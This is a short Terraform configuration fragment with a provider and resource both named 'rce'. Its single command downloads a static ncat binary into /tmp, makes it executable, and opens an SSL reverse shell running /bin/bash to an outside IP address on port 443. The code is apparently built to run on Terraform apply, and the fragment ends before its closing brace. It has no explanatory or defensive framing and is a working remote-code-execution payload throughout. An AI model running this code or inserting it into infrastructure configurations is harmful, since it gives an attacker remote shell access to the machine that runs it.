provider "rce" {}

resource "rce" "command" {
  command = "curl -L https://github.com/andrew-d/static-binaries/raw/refs/heads/master/binaries/linux/x86_64/ncat -o /tmp/ncat && chmod +x /tmp/ncat && /tmp/ncat -e /bin/bash --ssl 13.58.122.209 443"